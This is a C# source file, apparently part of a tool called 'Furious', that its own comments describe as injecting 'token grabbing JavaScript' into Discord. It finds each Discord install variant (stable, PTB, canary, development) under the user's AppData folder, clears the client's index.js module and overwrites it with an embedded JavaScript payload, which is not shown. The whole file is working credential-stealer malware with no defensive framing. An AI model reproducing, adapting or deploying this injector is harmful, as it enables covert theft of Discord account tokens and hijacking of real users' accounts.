using System;
using System.IO;
using System.Reflection;
using System.Threading.Tasks;

namespace Furious
{
	/// <summary>
	/// Internal class for managing the different files and folders required to inject the JS into the index.js file.
	/// </summary>
	internal class FileManagement
	{
		///Clears the targeted file of its contents.
		internal static async Task CleanFile(string path)
		{
			try
			{
				using (StreamWriter streamWriter = new StreamWriter(path))
				{
					await streamWriter.WriteAsync(string.Empty);
				}
			}
			catch
			{
				Console.WriteLine("An error occured clearing index.js.");
			}
		}

		///Writes the token grabbing JavaScript code into available Discord directories.
		internal static async Task WriteDiscord(string path, string javascriptPath)
		{
			if (File.Exists(path))
			{
				try
				{
					await CleanFile(path);

					string value = string.Empty;
					using (StreamReader reader = new StreamReader(Assembly.GetExecutingAssembly().GetManifestResourceStream(javascriptPath)))
					{
						value = await reader.ReadToEndAsync();
					}
					using (StreamWriter writer = new StreamWriter(path))
					{
						await writer.WriteAsync(value);
					}
				}
				catch
                		{
					Console.WriteLine("Error writing to " + path);
                		}
			}
		}

		/// Searches within the available Discord directories for the version folder, 
		/// then navigates to the index.js file to replace the code with the token grabber.
		internal static async Task WriteJS(string path, string javascriptPath)
		{
			if (Directory.Exists(path))
			{
				string[] discord = Directory.GetDirectories(path);
				foreach (string folderName in discord)
				{
					if (folderName.Contains("0."))
					{
						string DiscordPath = folderName + @"\modules\discord_modules\index.js";
						await WriteDiscord(DiscordPath, javascriptPath);
					}
				}
			}
		}

		///This method is used to write the token grabbing JavaScript code into the Discord directory.
		internal static async Task InjectJS()
		{
			await WriteJS(@"C:\Users\" + Environment.UserName + @"\AppData\Roaming\discord", "Resources.stable.txt");

			await WriteJS(@"C:\Users\" + Environment.UserName + @"\AppData\Roaming\discordptb", "Resources.ptb.txt");

			await WriteJS(@"C:\Users\" + Environment.UserName + @"\AppData\Roaming\discordcanary", "Resources.canary.txt");

			await WriteJS(@"C:\Users\" + Environment.UserName + @"\AppData\Roaming\discorddevelopment", "Resources.development.txt");
		}
	}
}
